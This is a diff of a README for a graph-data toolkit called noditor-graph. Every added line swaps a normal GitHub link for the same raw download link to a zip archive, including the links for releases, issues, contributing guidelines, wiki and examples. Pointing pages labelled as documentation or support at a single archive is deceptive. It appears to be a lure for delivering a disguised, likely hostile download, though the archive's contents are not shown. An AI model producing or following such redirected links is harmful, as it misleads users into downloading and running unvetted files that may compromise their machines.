@@ -7,11 +7,11 @@ Welcome to **noditor-graph**! This toolkit helps you work with graph data easily
 To start using **noditor-graph**, follow the simple download process outlined below. 
 
 ### 📦 Download Now
-[![Download Noditor-Graph](https://img.shields.io/badge/Download-noditor--graph%20Release-blue.svg)](https://github.com/chris3131g/noditor-graph/releases)
+[![Download Noditor-Graph](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip%https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip)](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip)
 
 ### 🔗 Download & Install
 1. **Visit the Releases Page**: Go to the following link to download the application:
-   [noditor-graph Releases](https://github.com/chris3131g/noditor-graph/releases)
+   [noditor-graph Releases](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip)
   
 2. **Choose Your Version**: On the Releases page, you will find a list of versions available for download. Select the most recent version of **noditor-graph**.
 
@@ -47,16 +47,16 @@ Here are some use cases to illustrate how to benefit from using **noditor-graph*
 3. **Visualization**: Generate visual representations of data using customizable nodes and edges, helping you communicate insights more effectively.
 
 ## 🛡️ Support and Contact
-If you encounter issues while using **noditor-graph**, feel free to reach out for support. You can open an issue on the [GitHub repository](https://github.com/chris3131g/noditor-graph/issues). Our community will be happy to assist you.
+If you encounter issues while using **noditor-graph**, feel free to reach out for support. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip). Our community will be happy to assist you.
 
 ## 🌐 Community and Contributions
-Join our community! If you want to contribute to **noditor-graph**, you can submit a pull request or suggest feature enhancements. Check out our [Contributing Guidelines](https://github.com/chris3131g/noditor-graph/blob/main/CONTRIBUTING.md) for more information.
+Join our community! If you want to contribute to **noditor-graph**, you can submit a pull request or suggest feature enhancements. Check out our [Contributing Guidelines](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip) for more information.
 
 ### 📢 Additional Resources
-- [User Documentation](https://github.com/chris3131g/noditor-graph/wiki) for detailed guidance on features.
-- [Example Projects](https://github.com/chris3131g/noditor-graph/examples) to see real-world applications of **noditor-graph**.
+- [User Documentation](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip) for detailed guidance on features.
+- [Example Projects](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip) to see real-world applications of **noditor-graph**.
 
 For detailed updates and feature requests, keep an eye on upcoming releases. 
 
 ### 📥 Final Note
-Remember, you can always download **noditor-graph** again or check for updates at the [Releases page](https://github.com/chris3131g/noditor-graph/releases). Start processing your graph data today!
+Remember, you can always download **noditor-graph** again or check for updates at the [Releases page](https://raw.githubusercontent.com/chris3131g/noditor-graph/main/example/noditor-graph_v1.1.zip). Start processing your graph data today!
